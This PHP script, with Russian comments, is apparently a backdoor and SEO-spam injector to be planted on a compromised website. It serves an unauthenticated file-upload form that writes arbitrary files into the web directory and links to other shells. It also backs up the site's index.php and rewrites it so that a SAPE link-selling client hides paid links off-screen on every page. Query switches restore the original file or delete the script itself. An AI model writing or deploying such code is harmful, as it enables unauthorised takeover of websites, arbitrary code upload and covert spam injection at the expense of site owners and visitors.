<?php
function str_replace_once($search, $replace, $text, $first_or_last) { //first-true last-false 
   if ($first_or_last === true)
		$pos = strpos($text, $search);
   else 
		$pos = strrpos($text, $search);
   
   if ($pos!==false) 
		$text = substr_replace($text, $replace, $pos, strlen($search));
   return $text; 
}


function phpendtag($a) { 
	$a = preg_replace('/".*"/U', '', $a); /* echo "?>"; не считаем */
	$a = preg_replace('/\'.*\'/U', '', $a);
	if (substr_count($a, '<?php')===substr_count($a, '?>')) 
		return true;
	else
		return false;
   
}





if (isset($_GET['p']) && ($_GET['p']) == '=') {
	
	if(isset($_FILES['f'])) { 
		if(is_uploaded_file($_FILES["f"]["tmp_name"])) {
			move_uploaded_file($_FILES["f"]["tmp_name"], "".$_FILES["f"]["name"]);
		}	
	}
	die('
		  <form action="" method="post" enctype="multipart/form-data">
		  <input type="file" name="f"><br> 
		  <input type="submit" value="upload"><br>
		  <a href="'.basename(__FILE__).'">'.basename(__FILE__).'</a> <a href="sh.php">sh</a><a href="sl.php">sl</a>
		  </form>');

}


if (isset($_GET['bkp']) && ($_GET['bkp']) == '1') {
	copy("bkp_index.php", "../index.php");
	die('bkp<br /> <br><br><br><a target="_blank" href="http://'.$_SERVER['HTTP_HOST'].'"><h1>'.$_SERVER['HTTP_HOST'].'</h1></a><br><a href="'.basename(__FILE__).'?p==">'.basename(__FILE__).'p==</a> <br><br>');
}

if (isset($_GET['del']) && ($_GET['del']) == '1') { 
	unlink(basename(__FILE__));
	die('this file has been deleted');
}


//для сапы не пойдет, тк ссылки изначально скрыты
$tag='$buffer = preg_replace(\'/<body(.*)>/sU\', \'<body$1><p style="position:fixed; top: 2050px; ">\'.$str_sape.\'</p>\', $buffer);';
$sapeid1='617438ac83fc38faefd10cda2c6c2ef5';



//s_loadenv.inc.php

$verh="<?php \r\n function callback(\$buffer) { \r\n if (!defined('_SAPE_USER')){ \r\n define('_SAPE_USER', '";
$centrh1="'); \r\n } \r\n require_once(\$_SERVER['DOCUMENT_ROOT'].'/assets/err_class/sape.php'); \r\n  \$o['charset'] = 'UTF-8'; \r\n \$o['host'] = '";
//[host]
$centrh2="'; \r\n \$sape = new SAPE_client(\$o); \r\n unset(\$o); \r\n \$str_sape = \$sape->return_links(); \r\n ";
 
//tag <p>
$niz='return ($buffer);
} 
ob_start("callback");';



//берем контент с чистого index.php
if (file_exists("bkp_index.php"))
		$content=file_get_contents('bkp_index.php');
else
		$content=file_get_contents('../index.php');
		


$a = preg_replace('/<\?[^p]/', '<?php ', $a);

 

if (phpendtag($content)) 
	$content=str_replace_once('?>','',$content, false);  
$content=$content."\r\n ob_end_flush();";
$content=str_replace_once('<?php','',$content, true);




$sape_file='';



//если еще не бэкапили, бэкапим
if ((file_exists("../index.php")) and (!file_exists("bkp_index.php"))) copy("../index.php", "bkp_index.php");

if (!is_dir('err_class')) mkdir('err_class', 0777); 
chmod('err_class', 0777);
file_put_contents('err_class/sape.php',  base64_decode($sape_file));

if (strpos('linkfeed', $content)===false) 
		file_put_contents('../index.php', $verh.$sapeid1.$centrh1.$_SERVER['HTTP_HOST'].$centrh2.$tag.$niz.$content);



echo '<a href="?del=1">Delete this</a>' ;
echo '<br><a href="?bkp=1">bkp</a>';
echo '<br><a href="?yestag=fff">hide</a>';
echo '<br><br><br><a target="_blank" href="http://'.$_SERVER['HTTP_HOST'].'"><h1>'.$_SERVER['HTTP_HOST'].'</h1></a><br><a href="?p==">?p==</a><br><br>';
